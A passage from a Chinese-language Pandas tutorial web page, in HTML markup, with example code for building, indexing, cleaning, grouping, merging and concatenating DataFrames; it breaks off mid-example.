class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">name  age      city<span class="token number">0</span>    Alice   <span class="token number">25</span>  New York<span class="token number">1</span>      Bob   <span class="token number">30</span>    London<span class="token number">2</span>  Charlie   <span class="token number">28</span>     Paris<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.1.3 从 Series 创建 DataFrame</strong></p><p>可以将多个 Series 组合成一个 DataFrame：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pdname <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>age <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">)</span>city <span class="token operator">=</span> pd<span class="token punctuation">.</span>Series<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'name'</span><span class="token punctuation">:</span> name<span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">:</span> age<span class="token punctuation">,</span> <span class="token string">'city'</span><span class="token punctuation">:</span> city<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">name  age      city<span class="token number">0</span>    Alice   <span class="token number">25</span>  New York<span class="token number">1</span>      Bob   <span class="token number">30</span>    London<span class="token number">2</span>  Charlie   <span class="token number">28</span>     Paris<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.2 DataFrame 的索引与选择数据</strong></p><p><strong>3.2.1 选择列</strong></p><p>可以使用列名来选择 DataFrame 的一列或多列：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 选择 'name' 列</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 选择 'name' 和 'age' 列</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.2.2 选择行</strong></p><p>可以使用 loc 和 iloc 来选择行：</p><ul><li>loc：通过行标签（索引）选择行。</li><li>iloc：通过行位置（整数索引）选择行。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>set_index<span class="token punctuation">(</span><span class="token string">'name'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 通过标签选择 Alice 这行，按标签</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 通过位置选择 第一行，按位置</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 选择前两行所有列</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">:</span><span class="token string">'Bob'</span><span class="token punctuation">,</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 通过标签选择 Alice 到 Bob 行的所有列</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.2.3 选择特定元素</strong></p><p>可以使用行和列的标签或位置来选择特定的元素：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 选择第 0 行 'name' 列的元素</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>iloc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># 选择第 0 行 第 0 列的元素</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.3 DataFrame 的基本操作</strong></p><p><strong>3.3.1 添加列</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df<span class="token punctuation">[</span><span class="token string">'gender'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Female'</span><span class="token punctuation">,</span> <span class="token string">'Male'</span><span class="token punctuation">,</span> <span class="token string">'Male'</span><span class="token punctuation">]</span> <span class="token comment"># 添加 'gender' 列</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.3.2 删除列</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'gender'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Female'</span><span class="token punctuation">,</span> <span class="token string">'Male'</span><span class="token punctuation">,</span> <span class="token string">'Male'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>drop<span class="token punctuation">(</span><span class="token string">'gender'</span><span class="token punctuation">,</span> axis<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># 删除 'gender' 列，axis=1 表示列</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.3.3 修改数据</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df<span class="token punctuation">.</span>loc<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'age'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">26</span> <span class="token comment"># 修改第 0 行 'age' 列的值</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.3.4 排序</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>sort_values<span class="token punctuation">(</span><span class="token string">'age'</span><span class="token punctuation">,</span> ascending<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span> <span class="token comment"># 按 'age' 列降序排序</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>3.4 DataFrame 的常用属性和方法</strong></p><ul><li>shape: 返回 DataFrame 的形状（行数，列数）。</li><li>index: 返回 DataFrame 的行索引。</li><li>columns: 返回 DataFrame 的列索引。</li><li>dtypes: 返回 DataFrame 每列的数据类型。</li><li>head(n): 返回 DataFrame 的前 n 行。</li><li>tail(n): 返回 DataFrame 的后 n 行。</li><li>info(): 显示 DataFrame 的基本信息，包括列名，数据类型，非空值数量等。</li><li>describe(): 返回 DataFrame 的统计摘要。</li><li>dropna(): 删除包含缺失值的行或列。</li><li>fillna(): 填充缺失值。</li></ul><p><strong>3.5 数据清洗</strong></p><p>数据清洗是数据分析中重要的一步，包括处理缺失值、重复值等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'name'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'Alice'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> <span class="token string">'Charlie'</span><span class="token punctuation">,</span> <span class="token string">'Bob'</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'age'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>nan<span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>nan<span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'city'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Paris'</span><span class="token punctuation">,</span> <span class="token string">'London'</span><span class="token punctuation">,</span> <span class="token string">'Unknown'</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">.</span>isnull<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 检测缺失值</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>dropna<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment"># 删除包含缺失值的行</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>drop_duplicates<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 删除重复行</span>df <span class="token operator">=</span> df<span class="token punctuation">.</span>fillna<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'age'</span><span class="token punctuation">:</span>df<span class="token punctuation">[</span><span class="token string">'age'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token comment"># 用平均值填充年龄缺失值</span><span class="token keyword">print</span><span class="token punctuation">(</span>df<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="4-Pandas-数据操作"><a href="#4-Pandas-数据操作" class="headerlink" title="4. Pandas 数据操作"></a><strong>4. Pandas 数据操作</strong></h3><p><strong>4.1 数据分组 (GroupBy)</strong></p><p>groupby() 方法允许你根据一个或多个列的值将 DataFrame 分组，然后可以对每个组进行聚合操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'category'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>grouped <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'category'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>grouped<span class="token punctuation">.</span>groups<span class="token punctuation">)</span> <span class="token comment"># 查看分组情况</span><span class="token keyword">print</span><span class="token punctuation">(</span>grouped<span class="token punctuation">.</span><span class="token builtin">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 对每个分组求和</span><span class="token keyword">print</span><span class="token punctuation">(</span>grouped<span class="token punctuation">.</span>mean<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 对每个分组求平均值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4.2 数据聚合 (Aggregation)</strong></p><p>聚合操作是对分组后的数据进行汇总计算，如求和、平均值、最大值、最小值等。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pd<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npdata <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'category'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'value'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">]</span><span class="token punctuation">}</span>df <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span>data<span class="token punctuation">)</span>grouped <span class="token operator">=</span> df<span class="token punctuation">.</span>groupby<span class="token punctuation">(</span><span class="token string">'category'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>grouped<span class="token punctuation">.</span>agg<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span> <span class="token string">'mean'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span><span class="token string">'min'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 同时执行多个聚合函数</span><span class="token keyword">print</span><span class="token punctuation">(</span>grouped<span class="token punctuation">.</span>agg<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span> np<span class="token punctuation">.</span>std<span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 对指定列执行不同的聚合函数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4.3 数据合并 (Merge, Join)</strong></p><p>merge() 方法用于将两个 DataFrame 根据共同的列合并在一起，类似于 SQL 的 JOIN 操作。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddf1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'value1'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>df2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'key'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'D'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'value2'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'原始数据'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df2<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================='</span><span class="token punctuation">)</span><span class="token comment"># 内连接(inner join)</span>merged_inner <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>df1<span class="token punctuation">,</span> df2<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">,</span> how<span class="token operator">=</span><span class="token string">'inner'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"inner join:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>merged_inner<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================='</span><span class="token punctuation">)</span><span class="token comment"># 左连接(left join)</span>merged_left <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>df1<span class="token punctuation">,</span> df2<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">,</span> how<span class="token operator">=</span><span class="token string">'left'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"left join:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>merged_left<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================='</span><span class="token punctuation">)</span><span class="token comment"># 右连接(right join)</span>merged_right <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>df1<span class="token punctuation">,</span> df2<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">,</span> how<span class="token operator">=</span><span class="token string">'right'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"right join:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>merged_right<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'======================='</span><span class="token punctuation">)</span><span class="token comment"># 外连接(outer join)</span>merged_outer <span class="token operator">=</span> pd<span class="token punctuation">.</span>merge<span class="token punctuation">(</span>df1<span class="token punctuation">,</span> df2<span class="token punctuation">,</span> on<span class="token operator">=</span><span class="token string">'key'</span><span class="token punctuation">,</span> how<span class="token operator">=</span><span class="token string">'outer'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"outer join:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>merged_outer<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>4.4 数据连接 (Concat)</strong></p><p>concat() 方法用于将两个或多个 DataFrame 沿着指定的轴连接在一起。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pandas <span class="token keyword">as</span> pddf1 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span>df2 <span class="token operator">=</span> pd<span class="token punctuation">.</span>DataFrame<span class="token punctuation">(</span><span class="token punctuation">{</span>    <span class="token string">'A'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token string">'B'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"原始数据:"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>df1<span class="token 